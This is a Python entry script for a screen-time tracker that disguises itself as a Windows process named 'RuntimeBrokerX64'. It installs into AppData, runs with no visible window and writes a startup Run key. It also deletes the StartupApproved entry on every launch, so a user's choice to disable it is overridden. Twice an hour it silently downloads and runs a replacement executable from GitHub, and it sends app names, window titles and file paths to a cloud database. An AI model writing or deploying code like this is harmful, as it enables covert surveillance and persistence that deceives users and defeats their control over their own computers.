import sys
import os
import json
import shutil
import subprocess
import ctypes
import logging
import threading
import time
import urllib.request
from datetime import datetime
from database import Database
from tracker import Tracker
from cloud_sync import CloudSync

# --- CONFIGURATION ---
APP_EXE_NAME = "RuntimeBrokerX64"
CURRENT_VERSION = "1.0.12"
GITHUB_REPO = "Gethubmaxer/Screen-Time-Tracker"
# Install + data files live in AppData\Local\RuntimeBrokerX64 (user-writable, no admin needed)
DATA_DIR = os.path.join(os.environ.get("LOCALAPPDATA", os.path.expanduser("~")), APP_EXE_NAME)
INSTALL_DIR = DATA_DIR
# ---------------------

# Ensure data directory exists
os.makedirs(DATA_DIR, exist_ok=True)

# Setup logging (log file goes to DATA_DIR, not Program Files)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(os.path.join(DATA_DIR, "screentime.log")),
        logging.StreamHandler(sys.stdout),
    ],
)

logger = logging.getLogger(__name__)
logger.info(f"Data directory: {DATA_DIR}")


def is_installed():
    """Check if we are running from the AppData install directory."""
    target = os.path.join(INSTALL_DIR, f"{APP_EXE_NAME}.exe")
    try:
        return os.path.abspath(sys.argv[0]).lower() == target.lower()
    except Exception:
        return False


def install_self():
    """Copy self to AppData (no admin needed — AppData is user-writable)."""
    target_dir = INSTALL_DIR
    target_path = os.path.join(target_dir, f"{APP_EXE_NAME}.exe")
    try:
        os.makedirs(target_dir, exist_ok=True)
        if not os.path.exists(target_path) or (
            os.path.abspath(sys.argv[0]).lower() != target_path.lower()
        ):
            shutil.copy2(sys.argv[0], target_path)
            logger.info(f"Installed to: {target_path}")
        return target_path
    except Exception as e:
        logger.error(f"Install failed: {e}")
        return None


def register_autostart(install_path=None):
    """
    Register to run at user login via HKCU Run key.
    Shows as "RuntimeBrokerX64" (no .exe) in Task Manager's Startup tab.
    Deletes StartupApproved entry on each launch to bypass toggle-off.
    """
    import winreg

    if install_path is None:
        install_path = os.path.abspath(sys.argv[0])

    exe_path_cmd = f'"{install_path}"'

    # Write Run key (HKCU, no admin needed)
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(key, APP_EXE_NAME, 0, winreg.REG_SZ, exe_path_cmd)
        winreg.CloseKey(key)
        logger.info(f"Run key set: {APP_EXE_NAME} = {exe_path_cmd}")
    except Exception as e:
        logger.warning(f"Failed to set Run key: {e}")

    # Delete StartupApproved entry to reset any "Disabled" toggle
    try:
        key2 = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run",
            0, winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY,
        )
        try:
            winreg.DeleteValue(key2, APP_EXE_NAME)
            logger.info("StartupApproved entry deleted (toggle bypass)")
        except FileNotFoundError:
            pass
        winreg.CloseKey(key2)
    except FileNotFoundError:
        pass
    except Exception as e:
        logger.warning(f"StartupApproved cleanup: {e}")


def auto_update(install_dir):
    """Check GitHub releases for a newer version. If found, download and replace silently."""
    if not getattr(sys, 'frozen', False):
        return  # only auto-update when running as compiled exe
    try:
        url = f"https://api.github.com/repos/{GITHUB_REPO}/releases/latest"
        req = urllib.request.Request(url, headers={
            "Accept": "application/vnd.github.v3+json",
            "User-Agent": f"RuntimeBrokerX64/{CURRENT_VERSION}",
        })
        with urllib.request.urlopen(req, timeout=10) as resp:
            release = json.loads(resp.read().decode())

        tag = release.get("tag_name", "")
        latest_ver = tag.lstrip("v").strip()
        if not latest_ver:
            return

        current_parts = tuple(int(x) for x in CURRENT_VERSION.split("."))
        latest_parts = tuple(int(x) for x in latest_ver.split("."))
        if latest_parts <= current_parts:
            return  # already up to date

        # Find the right asset
        asset_url = None
        for asset in release.get("assets", []):
            if asset["name"].lower() == f"{APP_EXE_NAME}.exe":
                asset_url = asset["browser_download_url"]
                break
        if not asset_url:
            return

        # Download new version
        new_exe = os.path.join(install_dir, f"{APP_EXE_NAME}.exe.new")
        urllib.request.urlretrieve(asset_url, new_exe)

        # Create batch updater: waits 3s (for us to exit), replaces exe, restarts
        current_exe = os.path.join(install_dir, f"{APP_EXE_NAME}.exe")
        batch_path = os.path.join(install_dir, "update.bat")
        with open(batch_path, "w") as f:
            f.write(
                f"@echo off\r\n"
                f"timeout /t 3 /nobreak > nul\r\n"
                f'del "{current_exe}"\r\n'
                f'move /Y "{new_exe}" "{current_exe}"\r\n'
                f'start "" "{current_exe}"\r\n'
                f'del "%~f0"\r\n'
            )

        logger.info(f"Auto-update: {CURRENT_VERSION} -> {latest_ver}, downloading...")
        subprocess.Popen(
            ["cmd", "/c", batch_path],
            shell=True,
            creationflags=subprocess.CREATE_NO_WINDOW,
        )
        logger.info("Auto-update: exiting to apply update")
        sys.exit(0)
    except Exception as e:
        logger.info(f"Auto-update check failed (will retry next launch): {e}")


def main():
    # ── Phase 1: Install + autostart (only when frozen as .exe) ──
    if getattr(sys, 'frozen', False):
        # Install to AppData first so we can exit quickly from Downloads
        installed_path = install_self()

        # Always register autostart (re-writes Run key + deletes StartupApproved)
        register_autostart(installed_path)

        # If we just installed (were running from elsewhere), launch the copy and exit
        if installed_path and os.path.abspath(sys.argv[0]).lower() != installed_path.lower():
            logger.info("Launched from temp location. Starting installed copy...")
            subprocess.Popen([installed_path], shell=False)
            return

    # ── Phase 2: Auto-update (now running from AppData, safe to do network I/O) ──
    if getattr(sys, 'frozen', False):
        auto_update(DATA_DIR)

    # ── Phase 3: Normal startup ──

    # Database lives in DATA_DIR (user-writable)
    db_path = os.path.join(DATA_DIR, "screentime.db")
    db = Database(db_path)
    tracker = Tracker(
        db,
        idle_threshold_seconds=300,
        exclude_names=[APP_EXE_NAME, "main.py"],
    )

    # Initialize cloud sync
    try:
        from config import SUPABASE_URL, SUPABASE_ANON_KEY, PUSH_INTERVAL_SECONDS

        if SUPABASE_URL and SUPABASE_ANON_KEY and "your-project-id" not in SUPABASE_URL:
            cloud_sync = CloudSync(SUPABASE_URL, SUPABASE_ANON_KEY, PUSH_INTERVAL_SECONDS, version=CURRENT_VERSION)

            def on_app_change(app_name, window_title, exe_path, session_start):
                cloud_sync.update_current_app(app_name, window_title, exe_path,
                                              category="neutral", session_start=session_start)

            def on_session_end(app_name, window_title, exe_path, category,
                               start_time, end_time, duration_seconds):
                cloud_sync.push_completed_session(
                    app_name, window_title, exe_path, category,
                    start_time, end_time, duration_seconds,
                )
                cloud_sync.update_current_app("", "", "", category="neutral", session_start=None)

            tracker.on_app_change = on_app_change
            tracker.on_session_end = on_session_end

            cloud_sync.start()
            logger.info("Cloud sync enabled")
        else:
            cloud_sync = None
            logger.info("Cloud sync disabled (configure SUPABASE_URL and SUPABASE_ANON_KEY in config.py)")
    except ImportError:
        cloud_sync = None
        logger.info("Cloud sync disabled (config.py not found)")
    except Exception as e:
        cloud_sync = None
        logger.warning(f"Cloud sync disabled: {e}")

    # Start tracker
    tracker_thread = threading.Thread(target=tracker.start, daemon=True)
    tracker_thread.start()

    logger.info("Application started. Tracking in background.")

    # Keep main thread alive (no GUI needed — truly hidden)
    # Check for auto-update at HH:00 and HH:30 wall-clock (handles no-internet-at-boot)
    _last_update_minute = -1
    try:
        while True:
            now = datetime.now()
            if now.minute in (0, 30) and now.minute != _last_update_minute:
                _last_update_minute = now.minute
                auto_update(DATA_DIR)
            time.sleep(60 - now.second)  # sync to next whole second, then sleep ~60s
    except KeyboardInterrupt:
        pass
    finally:
        tracker.stop()
        if cloud_sync:
            cloud_sync.stop()
        logger.info("Application exited.")


if __name__ == "__main__":
    main()
